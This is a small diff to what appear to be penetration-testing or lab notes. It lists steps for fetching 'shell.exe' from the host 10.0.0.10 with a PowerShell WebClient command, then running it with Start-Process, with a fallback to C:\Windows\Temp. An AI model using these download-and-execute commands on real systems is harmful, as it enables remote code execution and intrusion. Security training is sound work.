@@ -22,4 +22,4 @@
       - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.0.0.10:80/shell.exe', 'shell.exe')"`
   - dir to make sure in there
   - `Start-Process "shell-name.exe"`
-  - if not working CD to C:\Windows\Temp
+  - if not working `cd C:\Windows\Temp`
